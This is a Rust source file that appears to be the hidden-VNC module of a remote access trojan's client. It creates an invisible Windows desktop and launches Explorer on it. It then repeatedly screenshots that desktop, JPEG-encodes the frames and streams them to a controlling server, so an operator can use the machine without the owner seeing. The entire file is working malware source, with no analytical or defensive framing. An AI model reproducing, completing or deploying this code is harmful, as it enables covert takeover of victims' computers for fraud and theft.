use std::ffi::CString;
use std::io::Cursor;
use std::mem::zeroed;
use std::ptr::null_mut;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;

use common::packets::ServerboundPacket;
use image::RgbImage;
use image::codecs::jpeg::JpegEncoder;
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::shared::windef::HDESK;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::{CREATE_NEW_CONSOLE, STARTF_USESHOWWINDOW};
use winapi::um::winuser::{
    CloseDesktop, CreateDesktopA, GetDC, GetDesktopWindow, GetSystemMetrics, OpenDesktopA,
    ReleaseDC, SetThreadDesktop, SM_CXSCREEN, SM_CYSCREEN, SW_SHOWDEFAULT,
};
use winapi::um::wingdi::{
    BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits,
    SelectObject, SRCCOPY, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS,
};
use winapi::um::winnt::GENERIC_ALL;

use crate::handler::send_packet;

const HVNC_DESKTOP_NAME: &str = "Screen67";
const DESKTOP_WINDOWS: DWORD = winapi::um::winuser::DESKTOP_CREATEWINDOW;
const DESKTOP_WRITE: DWORD = winapi::um::winuser::DESKTOP_WRITEOBJECTS;
const DESKTOP_READ: DWORD = winapi::um::winuser::DESKTOP_READOBJECTS;
const DESKTOP_SWITCH: DWORD = winapi::um::winuser::DESKTOP_SWITCHDESKTOP;
const DESKTOP_ENUMERATE: DWORD = winapi::um::winuser::DESKTOP_ENUMERATE;
const ACCESS_FLAGS: DWORD = DESKTOP_WINDOWS
    | DESKTOP_WRITE
    | DESKTOP_READ
    | DESKTOP_SWITCH
    | DESKTOP_ENUMERATE
    | GENERIC_ALL;

static HVNC_ACTIVE: Mutex<Option<Arc<AtomicBool>>> = Mutex::new(None);

fn create_hidden_desktop() -> Option<HDESK> {
    let desktop_name = CString::new(HVNC_DESKTOP_NAME).ok()?;
    unsafe {
        let desktop = OpenDesktopA(desktop_name.as_ptr(), 0, FALSE, ACCESS_FLAGS);
        if !desktop.is_null() {
            return Some(desktop);
        }

        let created = CreateDesktopA(
            desktop_name.as_ptr(),
            null_mut(),
            null_mut(),
            0,
            ACCESS_FLAGS,
            null_mut(),
        );

        if created.is_null() {
            None
        } else {
            Some(created)
        }
    }
}

pub fn open_process(process_name: String) {
    let desktop_name =
        CString::new(HVNC_DESKTOP_NAME).unwrap_or_else(|_| CString::new("HiddenHVNCDesktop").unwrap());
    unsafe {
        let hvnc_desktop = OpenDesktopA(desktop_name.as_ptr(), 0, FALSE, ACCESS_FLAGS);
        if hvnc_desktop.is_null() {
            return;
        }

        if SetThreadDesktop(hvnc_desktop) == 0 {
            CloseDesktop(hvnc_desktop);
            return;
        }

        let desktop_path = CString::new(format!("WinSta0\\{}", HVNC_DESKTOP_NAME)).unwrap();
        let mut command = process_name.into_bytes();
        command.push(0);

        let mut startup_info: STARTUPINFOA = zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        startup_info.lpDesktop = desktop_path.as_ptr() as *mut i8;
        startup_info.dwFlags = STARTF_USESHOWWINDOW;
        startup_info.wShowWindow = SW_SHOWDEFAULT as u16;

        let mut process_info: PROCESS_INFORMATION = zeroed();
        let success = CreateProcessA(
            null_mut(),
            command.as_mut_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            FALSE,
            CREATE_NEW_CONSOLE,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        );

        if success != FALSE {
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }

        CloseDesktop(hvnc_desktop);
    }
}

fn capture_hvnc_screen() -> Option<(Vec<u8>, usize, usize)> {
    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        if width <= 0 || height <= 0 {
            return None;
        }

        let desktop_wnd = GetDesktopWindow();
        if desktop_wnd.is_null() {
            return None;
        }

        let hdc_screen = GetDC(desktop_wnd);
        if hdc_screen.is_null() {
            return None;
        }

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(desktop_wnd, hdc_screen);
            return None;
        }

        let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbitmap.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(desktop_wnd, hdc_screen);
            return None;
        }

        let old_obj = SelectObject(hdc_mem, hbitmap as _);

        BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);

        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: -height,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: BI_RGB,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [zeroed()],
        };

        let stride = ((width * 3 + 3) & !3) as usize;
        let mut buffer = vec![0u8; stride * (height as usize)];
        let result = GetDIBits(
            hdc_mem,
            hbitmap,
            0,
            height as u32,
            buffer.as_mut_ptr() as *mut _,
            &mut bmi,
            DIB_RGB_COLORS,
        );

        SelectObject(hdc_mem, old_obj);
        DeleteObject(hbitmap as _);
        DeleteDC(hdc_mem);
        ReleaseDC(desktop_wnd, hdc_screen);

        if result == 0 {
            return None;
        }

        let mut unpadded = Vec::with_capacity((width * height * 3) as usize);
        for row in buffer.chunks_exact(stride) {
            unpadded.extend_from_slice(&row[..(width * 3) as usize]);
        }

        Some((unpadded, width as usize, height as usize))
    }
}

pub fn start_hvnc() {
    stop_hvnc();

    let stop_flag = Arc::new(AtomicBool::new(false));
    *HVNC_ACTIVE.lock().unwrap() = Some(stop_flag.clone());

    thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("Failed to create Tokio runtime");

        let desktop_handle = match create_hidden_desktop() {
            Some(handle) => handle,
            None => {
                eprintln!("[HVNC] Failed to create hidden desktop");
                return;
            }
        };

        if unsafe { SetThreadDesktop(desktop_handle) } == 0 {
            eprintln!("[HVNC] Failed to set thread desktop");
            unsafe { CloseDesktop(desktop_handle) };
            return;
        }

        eprintln!("[HVNC] Hidden desktop created, launching explorer...");
        open_process("explorer.exe".to_string());

        // Give explorer time to start
        thread::sleep(std::time::Duration::from_secs(2));

        let mut frame_count: u64 = 0;

        while !stop_flag.load(Ordering::Relaxed) {
            if let Some((raw_data, width, height)) = capture_hvnc_screen() {
                let mut rgb_data = Vec::with_capacity(width * height * 3);
                for chunk in raw_data.chunks(3) {
                    let b = chunk[0];
                    let g = chunk[1];
                    let r = chunk[2];
                    rgb_data.extend_from_slice(&[r, g, b]);
                }

                if let Some(img) = RgbImage::from_raw(width as u32, height as u32, rgb_data) {
                    let mut jpeg_bytes = Cursor::new(Vec::new());
                    let mut encoder = JpegEncoder::new_with_quality(&mut jpeg_bytes, 70);
                    if encoder.encode_image(&img).is_ok() {
                        let frame_data = jpeg_bytes.into_inner();
                        frame_count += 1;
                        if frame_count % 10 == 0 {
                            eprintln!(
                                "[HVNC] Sent frame #{} ({}x{}, {} bytes)",
                                frame_count,
                                width,
                                height,
                                frame_data.len()
                            );
                        }
                        let packet = ServerboundPacket::HVNCFrame(frame_data);
                        if let Err(e) = rt.block_on(send_packet(packet)) {
                            eprintln!("[HVNC] Failed to send frame: {}", e);
                        }
                    } else {
                        eprintln!("[HVNC] JPEG encoding failed");
                    }
                } else {
                    eprintln!("[HVNC] Failed to create RGB image");
                }
            } else {
                eprintln!("[HVNC] Screen capture returned None");
            }

            thread::sleep(std::time::Duration::from_millis(125));
        }

        eprintln!("[HVNC] Stopping, sent {} frames total", frame_count);
        unsafe {
            CloseDesktop(desktop_handle);
        }
    });
}

pub fn stop_hvnc() {
    if let Some(flag) = HVNC_ACTIVE.lock().unwrap().take() {
        flag.store(true, Ordering::Relaxed);
    }
}
